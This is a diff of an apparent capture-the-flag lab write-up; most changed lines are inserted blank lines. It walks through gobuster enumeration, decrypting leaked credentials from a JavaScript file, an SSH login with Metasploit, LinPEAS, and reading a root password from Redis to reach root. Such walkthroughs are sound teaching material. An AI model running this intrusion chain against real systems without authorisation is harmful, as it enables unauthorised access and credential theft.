@@ -19,14 +19,21 @@ Ran gobuster on port 80:
 gobuster dir -u http://<ip>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,log,php,html,bak,zip
 
 Discovered:
+
 /css
+
 /js
+
 /manual
+
 /img
 
 Inside /js/main.js:
+
 Comment revealed AES encryption method
+
 Exposed decryption passphrase
+
 Hidden URL that returned a cookie value
 
 ✅ Decrypted the cookie using the key → Recovered SSH credentials for user auxerre
@@ -35,30 +42,46 @@ Hidden URL that returned a cookie value
 Used Metasploit Framework with ssh_login module:
 
 msfconsole
+
 search ssh_login
+
 use auxiliary/scanner/ssh/ssh_login
+
 set RHOSTS <ip>
+
 set USERNAME auxerre
+
 set PASSWORD <decrypted-password>
+
 run
 
 ✅ Access gained as limited user auxerre
 
 ##  Privilege Escalation (auxerre → root)
 Step 1 — Enumeration with LinPEAS:
+
 Uploaded linpeas.sh to /tmp
+
 Gave execute permission: chmod +x linpeas.sh
+
 ./linpeas.sh
 
 Enumerated Linpeas result: Found Redis service running on the target
 
+
 Step 2 — Exploiting Redis
+
 Enumerated Redis and retrieved stored root password:
+
 redis-cli
+
 KEYS *
+
 GET rootpass
 
+
 Switched to root using discovered credentials:
+
 su root
 
 ✅ Gained full root access
